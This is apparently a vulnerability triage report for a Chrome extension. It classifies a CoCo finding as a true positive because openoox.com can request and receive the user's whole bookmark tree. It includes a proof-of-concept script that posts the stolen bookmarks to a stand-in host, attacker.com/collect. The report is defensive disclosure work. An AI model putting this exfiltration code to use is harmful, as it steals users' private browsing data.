# CoCo Analysis: aefmgkhgcmdljpfijlohmbhkhflmbmfi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 22 (all related to BookmarkTreeNode flowing to sendResponseExternal)

---

## Sink: BookmarkTreeNode_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/aefmgkhgcmdljpfijlohmbhkhflmbmfi/opgen_generated_files/bg.js
Line 860: `var child = new BookmarkTreeNode();`
Line 861: `node.children = [child];`
Line 862: `var BookmarkTreeNode_source = [node];`

(Note: Lines 844-864 are CoCo framework code modeling chrome.bookmarks.getTree API)

**Code:**

```javascript
// Background script - External message listener (line 988)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
  if(request.source === "Openoox" && request.action) { // ← external message from openoox.com
    switch(request.action) {
      case 'check':
        sendResponse({
          source: "Chrome-addon"
        });
        break;
      case 'import': // ← attacker triggers bookmark import
        chrome.bookmarks.getTree(function(bookmarks) { // ← retrieves user's bookmarks
          sendResponse({ // ← SINK: sends sensitive bookmarks to attacker
            source: "Chrome-addon",
            bookmarks: bookmarks // ← user's complete bookmark tree
          });
        });
        return true; // allow async sendResponse
      default:
    }
  }
});
```

**Manifest permissions:**
```json
{
  "permissions": [
    "bookmarks", // ← has permission
    "tabs"
  ],
  "externally_connectable": {
    "matches": ["*://openoox.com/*"] // ← openoox.com can send external messages
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from website (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From attacker-controlled website at openoox.com:
chrome.runtime.sendMessage(
  'aefmgkhgcmdljpfijlohmbhkhflmbmfi', // extension ID
  {
    source: "Openoox",
    action: "import"
  },
  function(response) {
    // Receives user's complete bookmark tree
    console.log("Stolen bookmarks:", response.bookmarks);
    // Send to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response.bookmarks)
    });
  }
);
```

**Impact:** Sensitive data exfiltration - any page on openoox.com (or attacker who compromises openoox.com) can steal the user's complete bookmark tree, including all URLs, titles, and folder structure. Bookmarks often contain sensitive information like internal company tools, personal accounts, banking sites, etc. Per CRITICAL RULE #1, we ignore manifest.json externally_connectable restrictions - if even ONE domain can trigger the vulnerability, it is a TRUE POSITIVE.
